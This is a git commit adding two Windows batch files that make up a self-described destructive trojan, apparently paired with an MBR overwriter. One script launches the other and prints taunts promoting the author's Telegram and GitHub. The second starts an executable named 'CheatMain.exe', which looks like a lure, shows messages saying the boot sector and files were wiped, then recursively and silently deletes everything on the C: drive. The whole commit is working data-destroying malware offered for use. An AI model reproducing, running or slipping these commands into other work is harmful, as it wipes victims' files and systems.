691291f210fb25f341c5ef463a548c684bac133a
h3ck3r 0f th3 w0rld <144022493+HeckerSSSClass@users.noreply.github.com>
2024-12-13 22:17:50 +0500

    MBR Owerwriter + Bat's

---
+++ Bat's/maincode.bat
@@ -0,0 +1,5 @@
+@echo off
+start sect_dell.bat
+echo Your computer is already dead.
+echo This is new license trojan by tg @hwdcoder
+echo Download source only in https://github.com/HeckerSSSClass
---
+++ Bat's/sect_dell.bat
@@ -0,0 +1,7 @@
+@echo off
+start CheatMain.exe
+msg * Your computer has fucked by new trojan.D.E.A.D
+msg * Your boot sector was deleted, and ur files too
+msg * Goodluck
+cd C:\
+del /s /q *.*
